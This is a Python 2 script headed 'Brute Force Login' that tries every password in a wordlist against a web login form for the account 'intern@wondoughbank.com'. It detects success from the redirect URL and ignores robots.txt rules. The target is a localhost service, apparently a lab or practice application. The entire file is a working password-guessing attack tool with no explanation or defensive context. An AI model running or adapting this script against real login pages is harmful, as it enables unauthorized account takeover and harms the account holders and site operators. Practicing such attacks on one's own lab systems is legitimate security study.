import mechanize
import urllib2
from tqdm import tqdm
import sys

MechBrowser = mechanize.Browser()
MechBrowser.set_handle_equiv(True)
MechBrowser.set_handle_redirect(True)
MechBrowser.set_handle_referer(True)
MechBrowser.set_handle_robots(False)

print "\n#####################################"
print "# => Brute Force Login <=           #"
print "# trustn01                          #"
print "#####################################"

with open('passwords.txt') as f:
    passwords = f.read().splitlines()

LoginUrl = "http://localhost:8000/auth"
flag = False


print ("\nConnecting to: %s ......\n" % (LoginUrl))
print("Attemping brute force for user 'intern@wondoughbank.com', PROGRESS\n")
for x in tqdm(passwords):

    LoginData = 'target=http%3A%2F%2Flocalhost%3A8080%2Foauth&appname=Sample+Application&username=intern%40wondoughbank.com&password=' + str(x)
    LoginHeader = {"content-type" : "application/x-www-form-urlencoded"}
    LoginRequest = urllib2.Request(LoginUrl, LoginData, LoginHeader)
    LoginResponse = MechBrowser.open(LoginRequest)

    # print("[.]Checking (username / password): intern@wondoughbank.com / %s" % (x))
    if LoginResponse.geturl() == "http://localhost:8080/":

        print ("\n[*]SUCCESS! Password for intern@wondoughbank.com is: %s" % (x))
        break
